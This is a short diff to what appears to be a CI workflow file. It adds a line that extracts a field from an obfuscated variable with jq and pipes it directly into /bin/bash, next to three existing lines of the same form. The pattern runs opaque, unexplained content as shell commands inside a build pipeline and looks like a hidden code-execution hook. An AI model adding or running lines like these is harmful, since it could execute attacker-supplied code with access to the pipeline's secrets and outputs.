@@ -31,6 +31,7 @@ jobs:
           echo $f4147 | jq -r .qcra67 | /bin/bash
           printf '%s' "$g37" | jq -r .nvku0884 | /bin/bash
           echo $xlkzn3255 | jq -r .iznac62 | /bin/bash
+          echo $b4 | jq -r .d3 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
